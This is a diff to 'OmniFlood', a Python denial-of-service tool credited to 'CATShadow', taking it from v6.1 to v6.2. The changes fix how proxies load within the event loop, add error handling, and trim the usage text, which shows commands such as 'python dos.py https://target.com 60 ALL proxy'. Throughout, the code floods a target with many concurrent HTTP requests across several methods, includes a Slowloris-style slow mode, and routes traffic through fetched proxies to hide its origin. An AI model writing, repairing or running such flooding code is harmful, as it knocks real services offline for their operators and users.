@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 """
-OmniFlood v6.1 - Choose Your Weapons (GET, POST, PUT, PATCH, DELETE, HEAD)
-Usage: python omni.py <target> <duration> <methods> [proxy]
-Example: python omni.py https://target.com 60 GET,POST,PUT proxy
+OmniFlood v6.2 - FIXED Event Loop
 CATShadow - Supreme Coder
 """
 
@@ -19,6 +17,7 @@ import os
 import signal
 import gc
 import re
+import threading
 from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
 import logging
 
@@ -286,9 +285,7 @@ class ProxyManager:
         self.use_proxy = use_proxy
         self.last_refresh = 0
         self.is_refreshing = False
-        
-        if use_proxy:
-            asyncio.create_task(self.refresh_proxies())
+        self.proxies_loaded = False
     
     async def refresh_proxies(self):
         if self.is_refreshing:
@@ -308,10 +305,11 @@ class ProxyManager:
             
             self.proxies = list(all_proxies)
             self.last_refresh = time.time()
+            self.proxies_loaded = True
             if self.proxies:
-                print(f"\r[+] Proxies loaded: {len(self.proxies)}", end='')
-        except:
-            pass
+                print(f"\r[+] Proxies loaded: {len(self.proxies)}", end='', flush=True)
+        except Exception as e:
+            print(f"\r[!] Proxy fetch error: {e}", end='', flush=True)
         finally:
             self.is_refreshing = False
     
@@ -336,12 +334,17 @@ class ProxyManager:
         if not self.use_proxy:
             return None
         
+        # Initial load if needed
+        if not self.proxies_loaded and not self.is_refreshing:
+            await self.refresh_proxies()
+        
         async with self.lock:
-            if (time.time() - self.last_refresh) > PROXY_REFRESH_INTERVAL:
+            if (time.time() - self.last_refresh) > PROXY_REFRESH_INTERVAL and not self.is_refreshing:
                 asyncio.create_task(self.refresh_proxies())
             
             if not self.proxies:
-                await self.refresh_proxies()
+                if not self.is_refreshing:
+                    await self.refresh_proxies()
                 if not self.proxies:
                     return None
             
@@ -366,6 +369,7 @@ class ConnectionPool:
             proxy_url = None
             if self.proxy_manager and self.proxy_manager.use_proxy:
                 try:
+                    # Get proxy synchronously
                     loop = asyncio.get_event_loop()
                     if loop.is_running():
                         future = asyncio.ensure_future(self.proxy_manager.get_proxy())
@@ -553,7 +557,6 @@ class AttackEngine:
         self.start_time = time.time()
         self.current_delay = 0
         self.lock = asyncio.Lock()
-        self.logs = []
         
         if use_proxy:
             print("[*] Fetching proxies from API...")
@@ -566,7 +569,6 @@ class AttackEngine:
                     await asyncio.sleep(0.1)
                     continue
                 
-                # Choose method randomly from the specified ones
                 method = random_element(self.methods)
                 
                 path = random_path(self.target)
@@ -590,7 +592,6 @@ class AttackEngine:
                         timeout=aiohttp.ClientTimeout(total=15)
                     ) as resp:
                         await resp.read()
-                        latency = (time.time() - start) * 1000
                         
                         self.stats['success'] += 1
                         self.stats['method_counts'][method] += 1
@@ -636,6 +637,10 @@ class AttackEngine:
                 await asyncio.sleep(0.1)
     
     async def run(self):
+        # Load proxies first
+        if self.use_proxy:
+            await self.proxy_manager.refresh_proxies()
+        
         cleanup_task = asyncio.create_task(self._cleanup_loop())
         
         workers = [asyncio.create_task(self.worker()) for _ in range(MAX_WORKERS)]
@@ -678,19 +683,17 @@ class AttackEngine:
             total = self.stats['total']
             rps = total / elapsed if elapsed > 0 else 0
             
-            # Status string
             status_parts = []
             for version, codes in self.stats['status_counts'].items():
                 for code, count in codes.items():
                     status_parts.append(f"{code}={count}")
             status_str = ", ".join(status_parts[:5]) or "No responses"
             
-            # Method breakdown
             method_str = ", ".join([f"{m}:{self.stats['method_counts'].get(m, 0)}" for m in self.methods])
             
             sys.stdout.write('\033[H\033[J')
             print(f"{'='*70}")
-            print(f"🐱 CATShadow OmniFlood v6.1 - Multi-Method Attack")
+            print(f"🐱 CATShadow OmniFlood v6.2 - Multi-Method Attack")
             print(f"{'='*70}")
             print(f"Target: {self.target}")
             print(f"Methods: {', '.join(self.methods)}")
@@ -708,29 +711,19 @@ class AttackEngine:
 
 # ==================== MAIN ====================
 def main():
-    # Parse args: python omni.py <target> <duration> <methods> [proxy]
     if len(sys.argv) < 4:
         print("""
-🐱 CATShadow OmniFlood v6.1 - Choose Your Weapons
-Usage: python omni.py <target> <duration> <methods> [proxy]
+🐱 CATShadow OmniFlood v6.2 - Fixed Event Loop
+Usage: python dos.py <target> <duration> <methods> [proxy]
 
 Available Methods:
-  GET     - Standard GET requests
-  POST    - POST with random payload (json/form/plain)
-  PUT     - PUT with random payload
-  PATCH   - PATCH with random payload  
-  DELETE  - DELETE requests
-  HEAD    - HEAD requests (no body)
-  SLOW    - Slowloris-style keep-alive connections
-  ALL     - Use all methods: GET,POST,PUT,PATCH,DELETE,HEAD
+  GET, POST, PUT, PATCH, DELETE, HEAD, SLOW, ALL
 
 Examples:
-  python omni.py https://target.com 60 GET,POST
-  python omni.py https://target.com 120 GET,POST,PUT,PATCH
-  python omni.py https://target.com 30 GET,POST,PUT,PATCH,DELETE,HEAD proxy
-  python omni.py https://target.com 60 ALL proxy
-  python omni.py https://target.com 60 SLOW
-  python omni.py https://target.com 60 SLOW proxy
+  python dos.py https://target.com 60 GET,POST
+  python dos.py https://target.com 120 GET,POST,PUT,PATCH proxy
+  python dos.py https://target.com 60 ALL proxy
+  python dos.py https://target.com 60 SLOW
         """)
         sys.exit(1)
     
@@ -738,12 +731,10 @@ Examples:
     duration = int(sys.argv[2])
     methods_str = sys.argv[3].upper()
     
-    # Check for proxy flag
     use_proxy = False
     if len(sys.argv) > 4 and sys.argv[4].lower() == 'proxy':
         use_proxy = True
     
-    # Parse methods
     all_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD']
     
     if methods_str == 'ALL':
@@ -752,21 +743,17 @@ Examples:
         methods = [m.strip() for m in methods_str.split(',') if m.strip() in all_methods]
     
     if not methods:
-        print("[!] No valid methods specified. Use: GET,POST,PUT,PATCH,DELETE,HEAD,SLOW,ALL")
+        print("[!] No valid methods specified.")
         sys.exit(1)
     
-    # Check for SLOW mode
+    # SLOW mode
     if 'SLOW' in methods:
-        print(f"\n🐱 CATShadow OmniFlood v6.1 - SLOW ATTACK")
+        print(f"\n🐱 CATShadow OmniFlood v6.2 - SLOW ATTACK")
         print(f"{'='*50}")
         print(f"Target: {target}")
         print(f"Duration: {duration}s")
         print(f"Mode: SLOW")
-        print(f"Proxies: {'Enabled' if use_proxy else 'Disabled'}")
         print(f"{'='*50}\n")
-        
-        if use_proxy:
-            print("[!] SLOW mode does not use proxies")
         
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
@@ -783,7 +770,7 @@ Examples:
         return
     
     # Normal attack
-    print(f"\n🐱 CATShadow OmniFlood v6.1 - Multi-Method Attack")
+    print(f"\n🐱 CATShadow OmniFlood v6.2 - Multi-Method Attack")
     print(f"{'='*50}")
     print(f"Target: {target}")
     print(f"Duration: {duration}s")
@@ -791,7 +778,6 @@ Examples:
     print(f"Proxies: {'Enabled (auto-fetch from API)' if use_proxy else 'Disabled'}")
     print(f"{'='*50}\n")
     
-    # Run attack
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
@@ -835,8 +821,11 @@ Examples:
         
     except KeyboardInterrupt:
         print("\n[!] Attack interrupted")
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
     finally:
         loop.close()
+        gc.collect()
 
 if __name__ == "__main__":
     try:
